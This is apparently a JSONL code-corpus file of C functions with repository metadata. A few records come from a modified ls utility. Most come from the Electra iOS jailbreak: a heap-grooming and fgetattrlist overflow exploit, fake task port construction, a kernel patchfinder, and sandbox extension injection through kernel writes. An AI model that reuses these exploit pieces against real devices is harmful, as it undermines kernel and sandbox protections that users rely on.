{"docstring": "/* Sort the files now in the table.  */\n", "func_signal": "static void\nsort_files (void)", "code": "{\n  bool use_strcmp;\n\n  if (sorted_file_alloc < cwd_n_used + cwd_n_used / 2)\n    {\n      free (sorted_file);\n      sorted_file = xnmalloc (cwd_n_used, 3 * sizeof *sorted_file);\n      sorted_file_alloc = 3 * cwd_n_used;\n    }\n\n  initialize_ordering_vector ();\n\n  if (sort_type == sort_none)\n    return;\n\n  /* Try strcoll.  If it fails, fall back on strcmp.  We can't safely\n     ignore strcoll failures, as a failing strcoll might be a\n     comparison function that is not a total order, and if we ignored\n     the failure this might cause qsort to dump core.  */\n\n  if (! setjmp (failed_strcoll))\n    use_strcmp = false;      /* strcoll() succeeded */\n  else\n    {\n      use_strcmp = true;\n      assert (sort_type != sort_version);\n      initialize_ordering_vector ();\n    }\n\n  /* When sort_type == sort_time, use time_type as subindex.  */\n  mpsort ((void const **) sorted_file, cwd_n_used,\n          sort_functions[sort_type + (sort_type == sort_time ? time_type : 0)]\n                        [use_strcmp][sort_reverse]\n                        [directories_first]);\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Return the number of columns that format_user_or_group will print.  */\n", "func_signal": "static int\nformat_user_or_group_width (char const *name, unsigned long int id)", "code": "{\n  if (name)\n    {\n      int len = mbswidth (name, 0);\n      return MAX (0, len);\n    }\n  else\n    {\n      char buf[INT_BUFSIZE_BOUND (unsigned long int)];\n      sprintf (buf, \"%lu\", id);\n      return strlen (buf);\n    }\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Calculate the number of columns needed to represent the current set\n   of files in the current display width.  */\n", "func_signal": "static size_t\ncalculate_columns (bool by_columns)", "code": "{\n  size_t filesno;\t\t/* Index into cwd_file.  */\n  size_t cols;\t\t\t/* Number of files across.  */\n\n  /* Normally the maximum number of columns is determined by the\n     screen width.  But if few files are available this might limit it\n     as well.  */\n  size_t max_cols = MIN (max_idx, cwd_n_used);\n\n  init_column_info ();\n\n  /* Compute the maximum number of possible columns.  */\n  for (filesno = 0; filesno < cwd_n_used; ++filesno)\n    {\n      struct fileinfo const *f = sorted_file[filesno];\n      size_t name_length = length_of_file_name_and_frills (f);\n      size_t i;\n\n      for (i = 0; i < max_cols; ++i)\n        {\n          if (column_info[i].valid_len)\n            {\n              size_t idx = (by_columns\n                            ? filesno / ((cwd_n_used + i) / (i + 1))\n                            : filesno % (i + 1));\n              size_t real_length = name_length + (idx == i ? 0 : 2);\n\n              if (column_info[i].col_arr[idx] < real_length)\n                {\n                  column_info[i].line_len += (real_length\n                                              - column_info[i].col_arr[idx]);\n                  column_info[i].col_arr[idx] = real_length;\n                  column_info[i].valid_len = (column_info[i].line_len\n                                              < line_length);\n                }\n            }\n        }\n    }\n\n  /* Find maximum allowed columns.  */\n  for (cols = max_cols; 1 < cols; --cols)\n    {\n      if (column_info[cols - 1].valid_len)\n        break;\n    }\n\n  return cols;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Read directory NAME, and list the files in it.\n   If REALNAME is nonzero, print its name instead of NAME;\n   this is used for symbolic links to directories.\n   COMMAND_LINE_ARG means this directory was mentioned on the command line.  */\n", "func_signal": "static void\nprint_dir (char const *name, char const *realname, bool command_line_arg)", "code": "{\n  DIR *dirp;\n  struct dirent *next;\n  uintmax_t total_blocks = 0;\n  static bool first = true;\n\n  errno = 0;\n  dirp = opendir (name);\n  if (!dirp)\n    {\n      file_failure (command_line_arg, _(\"cannot open directory %s\"), name);\n      return;\n    }\n\n  if (LOOP_DETECT)\n    {\n      struct stat dir_stat;\n      int fd = dirfd (dirp);\n\n      /* If dirfd failed, endure the overhead of using stat.  */\n      if ((0 <= fd\n           ? fstat (fd, &dir_stat)\n           : stat (name, &dir_stat)) < 0)\n        {\n          file_failure (command_line_arg,\n                        _(\"cannot determine device and inode of %s\"), name);\n          closedir (dirp);\n          return;\n        }\n\n      /* If we've already visited this dev/inode pair, warn that\n         we've found a loop, and do not process this directory.  */\n      if (visit_dir (dir_stat.st_dev, dir_stat.st_ino))\n        {\n          error (0, 0, _(\"%s: not listing already-listed directory\"),\n                 quotearg_colon (name));\n          closedir (dirp);\n          set_exit_status (true);\n          return;\n        }\n\n      DEV_INO_PUSH (dir_stat.st_dev, dir_stat.st_ino);\n    }\n\n  if (recursive || print_dir_name)\n    {\n      if (!first)\n        DIRED_PUTCHAR ('\\n');\n      first = false;\n      DIRED_INDENT ();\n      PUSH_CURRENT_DIRED_POS (&subdired_obstack);\n      dired_pos += quote_name (stdout, realname ? realname : name,\n                               dirname_quoting_options, NULL);\n      PUSH_CURRENT_DIRED_POS (&subdired_obstack);\n      DIRED_FPUTS_LITERAL (\":\\n\", stdout);\n    }\n\n  /* Read the directory entries, and insert the subfiles into the `cwd_file'\n     table.  */\n\n  clear_files ();\n\n  while (1)\n    {\n      /* Set errno to zero so we can distinguish between a readdir failure\n         and when readdir simply finds that there are no more entries.  */\n      errno = 0;\n      next = readdir (dirp);\n      if (next)\n        {\n          if (! file_ignored (next->d_name))\n            {\n              enum filetype type = unknown;\n\n#if HAVE_STRUCT_DIRENT_D_TYPE\n              switch (next->d_type)\n                {\n                case DT_BLK:  type = blockdev;\t\tbreak;\n                case DT_CHR:  type = chardev;\t\tbreak;\n                case DT_DIR:  type = directory;\t\tbreak;\n                case DT_FIFO: type = fifo;\t\tbreak;\n                case DT_LNK:  type = symbolic_link;\tbreak;\n                case DT_REG:  type = normal;\t\tbreak;\n                case DT_SOCK: type = sock;\t\tbreak;\n# ifdef DT_WHT\n                case DT_WHT:  type = whiteout;\t\tbreak;\n# endif\n                }\n#endif\n              total_blocks += gobble_file (next->d_name, type,\n                                           RELIABLE_D_INO (next),\n                                           false, name);\n\n              /* In this narrow case, print out each name right away, so\n                 ls uses constant memory while processing the entries of\n                 this directory.  Useful when there are many (millions)\n                 of entries in a directory.  */\n              if (format == one_per_line && sort_type == sort_none\n                      && !print_block_size && !recursive)\n                {\n                  /* We must call sort_files in spite of\n                     \"sort_type == sort_none\" for its initialization\n                     of the sorted_file vector.  */\n                  sort_files ();\n                  print_current_files ();\n                  clear_files ();\n                }\n            }\n        }\n      else if (errno != 0)\n        {\n          file_failure (command_line_arg, _(\"reading directory %s\"), name);\n          if (errno != EOVERFLOW)\n            break;\n        }\n      else\n        break;\n    }\n\n  if (closedir (dirp) != 0)\n    {\n      file_failure (command_line_arg, _(\"closing directory %s\"), name);\n      /* Don't return; print whatever we got.  */\n    }\n\n  /* Sort the directory contents.  */\n  sort_files ();\n\n  /* If any member files are subdirectories, perhaps they should have their\n     contents listed rather than being mentioned here as files.  */\n\n  if (recursive)\n    extract_dirs_from_files (name, command_line_arg);\n\n  if (format == long_format || print_block_size)\n    {\n      const char *p;\n      char buf[LONGEST_HUMAN_READABLE + 1];\n\n      DIRED_INDENT ();\n      p = _(\"total\");\n      DIRED_FPUTS (p, stdout, strlen (p));\n      DIRED_PUTCHAR (' ');\n      p = human_readable (total_blocks, buf, human_output_opts,\n                          ST_NBLOCKSIZE, output_block_size);\n      DIRED_FPUTS (p, stdout, strlen (p));\n      DIRED_PUTCHAR ('\\n');\n    }\n\n  if (cwd_n_used)\n    print_current_files ();\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/* Print the user or group name NAME, with numeric id ID, using a\n   print width of WIDTH columns.  */\n", "func_signal": "static void\nformat_user_or_group (char const *name, unsigned long int id, int width)", "code": "{\n  size_t len;\n\n  if (name)\n    {\n      int width_gap = width - mbswidth (name, 0);\n      int pad = MAX (0, width_gap);\n      fputs (name, stdout);\n      len = strlen (name) + pad;\n\n      do\n        putchar (' ');\n      while (pad--);\n    }\n  else\n    {\n      printf (\"%*lu \", width, id);\n      len = width;\n    }\n\n  dired_pos += len + 1;\n}", "path": "ls.c", "repo_name": "mnurzia/even-better-ls", "stars": 479, "license": "None", "language": "c", "size": 91}
{"docstring": "/****** fun *******/\n", "func_signal": "CACHED_FIND_UINT64(find_add_x0_x0_0x40_ret)", "code": "{\n\taddr_t off;\n\tuint32_t *k;\n\tk = (uint32_t *)(kernel + xnucore_base);\n\tfor (off = 0; off < xnucore_size - 4; off += 4, k++) {\n\t\tif (k[0] == 0x91010000 && k[1] == 0xD65F03C0) {\n\t\t\treturn off + xnucore_base + kerndumpbase;\n\t\t}\n\t}\n\tk = (uint32_t *)(kernel + prelink_base);\n\tfor (off = 0; off < prelink_size - 4; off += 4, k++) {\n\t\tif (k[0] == 0x91010000 && k[1] == 0xD65F03C0) {\n\t\t\treturn off + prelink_base + kerndumpbase;\n\t\t}\n\t}\n\treturn 0;\n}", "path": "basebinaries\\jailbreakd\\patchfinder64.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// get kernel address of IODTNVRAM object\n", "func_signal": "uint64_t get_iodtnvram_obj(void)", "code": "{\n    // get user serv\n    io_service_t IODTNVRAMSrv = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching(\"IODTNVRAM\"));\n    \n    // leak user serv\n    // it should use via_kmem_read method by now, so second param doesn't matter\n    uint64_t nvram_up = find_port(IODTNVRAMSrv);\n    // get kern obj -- IODTNVRAM*\n    uint64_t IODTNVRAMObj = rk64(nvram_up + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n    \n    return IODTNVRAMObj;\n}", "path": "electra1131\\post-exploit\\unlocknvram.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// str8 = step64_back(kernel, ref, ref - bof, INSN_STR8);\n", "func_signal": "static addr_t\nstep64_back(const uint8_t *buf, addr_t start, size_t length, uint32_t what, uint32_t mask)", "code": "{\n    addr_t end = start - length;\n    while (start >= end) {\n        uint32_t x = *(uint32_t *)(buf + start);\n        if ((x & mask) == what) {\n            return start;\n        }\n        start -= 4;\n    }\n    return 0;\n}", "path": "basebinaries\\jailbreakd\\patchfinder64.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// to free them either receive the message or destroy the port\n", "func_signal": "mach_port_t hold_kallocs(uint32_t kalloc_size, int allocs_per_message, int messages_to_send, mach_port_t holder_port, mach_port_t* source_ports)", "code": "{\n  if (messages_to_send > MACH_PORT_QLIMIT_LARGE) {\n    printf(\"****************** too many messages\\n\");\n    return MACH_PORT_NULL;\n  }\n  \n  kern_return_t err;\n  mach_port_t port = MACH_PORT_NULL;\n  \n  if (holder_port == MACH_PORT_NULL) {\n    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);\n    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);\n    \n    if (err != KERN_SUCCESS) {\n      printf(\"failed to allocate port for hold kallocs\\n\");\n    }\n    \n    // bump up the number of messages we can enqueue:\n    mach_port_limits_t limits = {0};\n    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;\n    err = mach_port_set_attributes(mach_task_self(),\n                                   port,\n                                   MACH_PORT_LIMITS_INFO,\n                                   (mach_port_info_t)&limits,\n                                   MACH_PORT_LIMITS_INFO_COUNT);\n    if (err != KERN_SUCCESS) {\n      printf(\" [-] failed to increase queue limit\\n\");\n      return ERR_EXPLOIT;\n    }\n  } else {\n    port = holder_port;\n  }\n  \n  // these are MACH_PORT_NULL\n  mach_port_t* ports_to_send = calloc(kalloc_size/8, sizeof(mach_port_name_t));\n  \n  size_t message_size = offsetof(struct ool_multi_msg, ool_ports[allocs_per_message+1]);\n  struct ool_multi_msg* msg = malloc(message_size);\n  \n  memset(msg, 0, message_size);\n  \n  msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);\n  msg->hdr.msgh_size = (uint32_t) message_size;\n  msg->hdr.msgh_remote_port = port;\n  msg->hdr.msgh_local_port = MACH_PORT_NULL;\n  msg->hdr.msgh_id = 0x12340101;\n  \n  msg->body.msgh_descriptor_count = allocs_per_message;\n  \n  for (int i = 0; i < allocs_per_message; i++) {\n    msg->ool_ports[i].address = source_ports != NULL ? source_ports : ports_to_send;\n    msg->ool_ports[i].count = kalloc_size/8;\n    msg->ool_ports[i].deallocate = 0;\n    msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;\n    msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;\n    msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;\n  }\n  \n  for (int i = 0; i < messages_to_send; i++) {\n    // send it:\n    err = mach_msg(&msg->hdr,\n                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,\n                   (uint32_t)message_size,\n                   0,\n                   MACH_PORT_NULL,\n                   MACH_MSG_TIMEOUT_NONE,\n                   MACH_PORT_NULL);\n    if (err != KERN_SUCCESS) {\n      printf(\"%s\\n\", mach_error_string(err));\n      //return ERR_EXPLOIT;\n    }\n  }\n  free(ports_to_send);\n  free(msg);\n  \n  return port;\n}", "path": "electra1131\\exploit\\empty_list\\vfs_sploit.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "/* patchfinder ***************************************************************/\n", "func_signal": "static addr_t\nstep64(const uint8_t *buf, addr_t start, size_t length, uint32_t what, uint32_t mask)", "code": "{\n    addr_t end = start + length;\n    while (start < end) {\n        uint32_t x = *(uint32_t *)(buf + start);\n        if ((x & mask) == what) {\n            return start;\n        }\n        start += 4;\n    }\n    return 0;\n}", "path": "basebinaries\\jailbreakd\\patchfinder64.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// MAD props to Externalist for his cleanup and changes to the spinners and threads that improved this exploit.\n// I, GeoSn0w (@FCE365) added them to Electra and patched things up but they were not my idea so the author should be credited\n// that is https://github.com/externalist/exploit_playground\n// DO NOT REMOVE THIS!\n", "func_signal": "void empty_list_build_fake_task_port(uint8_t* fake_port, uint64_t fake_port_kaddr, uint64_t initial_read_addr, uint64_t vm_map, uint64_t receiver, uint64_t context)", "code": "{\n  memset(fake_port, 0, 0x500);\n  \n  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_BITS)) = IO_BITS_ACTIVE | IKOT_TASK;\n  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES)) = 0xf00d; // leak references\n  *(uint32_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS)) = 0xf00d; // leak srights\n  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER)) = receiver;\n  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT)) = context;\n  \n  \n  uint64_t fake_task_kaddr = fake_port_kaddr + 0x100;\n  *(uint64_t*)(fake_port+koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = fake_task_kaddr;\n  \n  uint8_t* fake_task = fake_port + 0x100;\n  \n  // set the ref_count field of the fake task:\n  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_REF_COUNT)) = 0xd00d; // leak references\n  \n  // make sure the task is active\n  *(uint32_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_ACTIVE)) = 1;\n  \n  // set the vm_map of the fake task:\n  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = vm_map;\n  \n  // set the task lock type of the fake task's lock:\n  *(uint8_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_LCK_MTX_TYPE)) = 0x22;\n  \n  // set the bsd_info pointer to be 0x10 bytes before the desired initial read:\n  *(uint64_t*)(fake_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)) = initial_read_addr - 0x10;\n}", "path": "electra1131\\exploit\\empty_list\\vfs_sploit.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// XXX error handling just for fun? :)\n", "func_signal": "uint64_t _OSUnserializeXML(const char* buffer)", "code": "{\n\tsize_t len = strlen(buffer) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, buffer, len);\n\n\tuint64_t errorptr = 0;\n\n\tuint64_t rv = kexecute(find_osunserializexml(), ks, errorptr, 0, 0, 0, 0, 0);\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "basebinaries\\jailbreakd\\osobject.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// thx PhoenixNonce\n", "func_signal": "CFMutableDictionaryRef makedict(const char *key, const char *val)", "code": "{\n    CFStringRef cfkey = CFStringCreateWithCStringNoCopy(NULL, key, kCFStringEncodingUTF8, kCFAllocatorNull);\n    CFStringRef cfval = CFStringCreateWithCStringNoCopy(NULL, val, kCFStringEncodingUTF8, kCFAllocatorNull);\n\n    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFCopyStringDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);\n    if(!cfkey || !dict || !cfval) {\n        ERROR(\"failed to alloc cf objects {'%s': '%s'}\", key, val);\n        return NULL;\n    } else {\n        DEBUG(\"made dict {'%s': '%s'}\", key, val);\n    }\n    CFDictionarySetValue(dict, cfkey, cfval);\n\n    CFRelease(cfkey);\n    CFRelease(cfval);\n    return dict;\n}", "path": "electra1131\\post-exploit\\utilities\\nonce.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// read_fd and write_fd are the pipe fds which have a pipe buffer at known_addr\n", "func_signal": "void prepare_early_read_primitive(mach_port_t target_port, int read_fd, int write_fd, uint64_t known_kaddr)", "code": "{\n  early_read_port = target_port;\n  early_read_read_fd = read_fd;\n  early_read_write_fd = write_fd;\n  early_read_known_kaddr = known_kaddr;\n}", "path": "electra1131\\exploit\\empty_list\\vfs_sploit.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// get 64 higher bits of 64bit int multiplication\n// https://stackoverflow.com/a/28904636\n// ofc in asm it's done with 1 instruction huh\n// XXX there has to be a cleaner way utilizing hardware support\n", "func_signal": "uint64_t mulhi(uint64_t a, uint64_t b)", "code": "{\n\tuint64_t    a_lo = (uint32_t)a;\n\tuint64_t    a_hi = a >> 32;\n\tuint64_t    b_lo = (uint32_t)b;\n\tuint64_t    b_hi = b >> 32;\n\n\tuint64_t    a_x_b_hi =  a_hi * b_hi;\n\tuint64_t    a_x_b_mid = a_hi * b_lo;\n\tuint64_t    b_x_a_mid = b_hi * a_lo;\n\tuint64_t    a_x_b_lo =  a_lo * b_lo;\n\n\tuint64_t    carry_bit = ((uint64_t)(uint32_t)a_x_b_mid +\n\t                         (uint64_t)(uint32_t)b_x_a_mid +\n\t                         (a_x_b_lo >> 32) ) >> 32;\n\n\tuint64_t    multhi = a_x_b_hi +\n\t                     (a_x_b_mid >> 32) + (b_x_a_mid >> 32) +\n\t                     carry_bit;\n\n\treturn multhi;\n}", "path": "basebinaries\\jailbreakd\\sandbox.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// Notice: path should *not* end with '/' !\n", "func_signal": "uint64_t extension_create_file(const char* path, uint64_t nextptr)", "code": "{\n\tsize_t slen = strlen(path);\n\n\tif (path[slen - 1] == '/') {\n\t\tfprintf(stderr, \"No traling slash in path pls\\n\");\n\t\treturn 0;\n\t}\n\n\tuint64_t ext_p = smalloc(sizeof(struct extension));\n\tuint64_t ks = sstrdup(path);\n\n\tif (ext_p && ks) {\n\t\tstruct extension ext;\n\t\tbzero(&ext, sizeof(ext));\n\t\text.next = nextptr;\n\t\text.desc = 0xffffffffffffffff;\n\t\t\n\t\t// ext.type = 0;\n\t\t// ext.subtype = 0;\n\n\t\text.data = ks;\n\t\text.data_len = slen;\n\n\t\tkwrite(ext_p, &ext, sizeof(ext));\n\t} else {\n\t\t// XXX oh no a leak\n\t}\n\n\treturn ext_p;\n}", "path": "basebinaries\\jailbreakd\\sandbox.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "/* Routine call */\n", "func_signal": "mig_internal novalue _Xcall\n\t(mach_msg_header_t *InHeadP, mach_msg_header_t *OutHeadP)", "code": "{\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tuint8_t command;\n\t\tchar commandPad[3];\n\t\tuint32_t pid;\n\t\tmach_msg_trailer_t trailer;\n\t} Request __attribute__((unused));\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\ttypedef __Request__call_t __Request;\n\ttypedef __Reply__call_t Reply __attribute__((unused));\n\n\t/*\n\t * typedef struct {\n\t * \tmach_msg_header_t Head;\n\t * \tNDR_record_t NDR;\n\t * \tkern_return_t RetCode;\n\t * } mig_reply_error_t;\n\t */\n\n\tRequest *In0P = (Request *) InHeadP;\n\tReply *OutP = (Reply *) OutHeadP;\n#ifdef\t__MIG_check__Request__call_t__defined\n\tkern_return_t check_result;\n#endif\t/* __MIG_check__Request__call_t__defined */\n\n\t__DeclareRcvRpc(500, \"call\")\n\t__BeforeRcvRpc(500, \"call\")\n\n#if\tdefined(__MIG_check__Request__call_t__defined)\n\tcheck_result = __MIG_check__Request__call_t((__Request *)In0P);\n\tif (check_result != MACH_MSG_SUCCESS)\n\t\t{ MIG_RETURN_ERROR(OutP, check_result); }\n#endif\t/* defined(__MIG_check__Request__call_t__defined) */\n\n\tOutP->RetCode = jbd_call(In0P->Head.msgh_request_port, In0P->command, In0P->pid);\n\n\tOutP->NDR = NDR_record;\n\n\n\t__AfterRcvRpc(500, \"call\")\n}", "path": "basebinaries\\jailbreakd\\mach\\jailbreak_daemonServer.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// 1 if yes\n", "func_signal": "int has_file_extension(uint64_t sb, const char* path)", "code": "{\n\tconst char* desc = ent_key;\n\tint found = 0;\n\n\tint slot = hashing_magic(ent_key);\n\tuint64_t insert_at_p = sb + sizeof(void*) + slot * sizeof(void*);\n\tuint64_t insert_at = rk64(insert_at_p);\n\n\twhile (insert_at != 0) {\n\t\tuint64_t kdsc = rk64(insert_at + offsetof(struct extension_hdr, desc));\n\n\t\tif (kstrcmp(kdsc, desc) == 0) {\n\t\t\tbreak;\n\t\t}\n\n\t\tinsert_at_p = insert_at;\n\t\tinsert_at = rk64(insert_at);\n\t}\n\n\tif (insert_at != 0) {\n\t\tuint64_t ext_lst = rk64(insert_at + offsetof(struct extension_hdr, ext_lst));\n\n\t\tuint64_t plen = strlen(path);\n\t\tchar *exist = malloc(plen + 1);\n\t\texist[plen] = '\\0';\n\n\t\twhile (ext_lst != 0) {\n\t\t\t// XXX no type/subtype check\n\t\t\tuint64_t data_len = rk64(ext_lst + offsetof(struct extension, data_len));\n\t\t\tif (data_len == plen) {\n\t\t\t\tuint64_t data = rk64(ext_lst + offsetof(struct extension, data));\n\t\t\t\tkread(data, exist, plen);\n\n\t\t\t\tif (strcmp(path, exist) == 0) {\n\t\t\t\t\tfound = 1;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t}\n\n\t\t\text_lst = rk64(ext_lst);\n\t\t}\n\t\t\n\n\t\tfree(exist);\n\t}\n\n\treturn found;\n}", "path": "basebinaries\\jailbreakd\\sandbox.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// this will do a kalloc.16, overflow out of it with 8 NULL bytes, then free it\n", "func_signal": "void do_vfs_overflow()", "code": "{\n  int options = 0;\n  int err = fgetattrlist(vfs_fd, &al, attrBuf, attrBufSize, options);\n  //printf(\"err: %d\\n\", err);\n}", "path": "electra1131\\exploit\\empty_list\\vfs_sploit.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "/* Routine call */\n", "func_signal": "mig_external kern_return_t jbd_call\n(\n\tmach_port_t server_port,\n\tuint8_t command,\n\tuint32_t pid\n)", "code": "{\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tuint8_t command;\n\t\tchar commandPad[3];\n\t\tuint32_t pid;\n\t} Request __attribute__((unused));\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tmach_msg_trailer_t trailer;\n\t} Reply __attribute__((unused));\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t} __Reply __attribute__((unused));\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\t/*\n\t * typedef struct {\n\t * \tmach_msg_header_t Head;\n\t * \tNDR_record_t NDR;\n\t * \tkern_return_t RetCode;\n\t * } mig_reply_error_t;\n\t */\n\n\tunion {\n\t\tRequest In;\n\t\tReply Out;\n\t} Mess;\n\n\tRequest *InP = &Mess.In;\n\tReply *Out0P = &Mess.Out;\n\n\tmach_msg_return_t msg_result;\n\n#ifdef\t__MIG_check__Reply__call_t__defined\n\tkern_return_t check_result;\n#endif\t/* __MIG_check__Reply__call_t__defined */\n\n\t__DeclareSendRpc(500, \"call\")\n\n\tInP->NDR = NDR_record;\n\n\tInP->command = command;\n\n\tInP->pid = pid;\n\n\tInP->Head.msgh_bits =\n\t\tMACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);\n\t/* msgh_size passed as argument */\n\tInP->Head.msgh_request_port = server_port;\n\tInP->Head.msgh_reply_port = mig_get_reply_port();\n\tInP->Head.msgh_id = 500;\n\tInP->Head.msgh_reserved = 0;\n\t\n/* BEGIN VOUCHER CODE */\n\n#ifdef USING_VOUCHERS\n\tif (voucher_mach_msg_set != NULL) {\n\t\tvoucher_mach_msg_set(&InP->Head);\n\t}\n#endif // USING_VOUCHERS\n\t\n/* END VOUCHER CODE */\n\n\t__BeforeSendRpc(500, \"call\")\n\tmsg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, (mach_msg_size_t)sizeof(Request), (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);\n\t__AfterSendRpc(500, \"call\")\n\tif (msg_result != MACH_MSG_SUCCESS) {\n\t\t__MachMsgErrorWithoutTimeout(msg_result);\n\t\t{ return msg_result; }\n\t}\n\n\n#if\tdefined(__MIG_check__Reply__call_t__defined)\n\tcheck_result = __MIG_check__Reply__call_t((__Reply__call_t *)Out0P);\n\tif (check_result != MACH_MSG_SUCCESS)\n\t\t{ return check_result; }\n#endif\t/* defined(__MIG_check__Reply__call_t__defined) */\n\n\treturn KERN_SUCCESS;\n}", "path": "basebinaries\\jailbreakd\\mach\\jailbreak_daemonUser.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSDictionary_SetItem(uint64_t dict, const char *key, uint64_t val)", "code": "{\n\tsize_t len = strlen(key) + 1;\n\n\tuint64_t ks = kalloc(len);\n\tkwrite(ks, key, len);\n\n\tuint64_t vtab = rk64(dict);\n\tuint64_t f = rk64(vtab + off_OSDictionary_SetObjectWithCharP);\n\n\tint rv = (int) kexecute(f, dict, ks, val, 0, 0, 0, 0);\n\n\tkfree(ks, len);\n\n\treturn rv;\n}", "path": "basebinaries\\jailbreakd\\osobject.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "// 1 on success, 0 on error\n", "func_signal": "int OSArray_Merge(uint64_t array, uint64_t aArray)", "code": "{\n\tuint64_t vtab = rk64(array);\n\tuint64_t f = rk64(vtab + off_OSArray_Merge);\n\n\treturn (int) kexecute(f, array, aArray, 0, 0, 0, 0, 0);\n}", "path": "basebinaries\\jailbreakd\\osobject.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
{"docstring": "/* disassembler **************************************************************/\n", "func_signal": "static int HighestSetBit(int N, uint32_t imm)", "code": "{\n\tint i;\n\tfor (i = N - 1; i >= 0; i--) {\n\t\tif (imm & (1 << i)) {\n\t\t\treturn i;\n\t\t}\n\t}\n\treturn -1;\n}", "path": "basebinaries\\jailbreakd\\patchfinder64.c", "repo_name": "coolstar/electra1131", "stars": 366, "license": "gpl-3.0", "language": "c", "size": 23526}
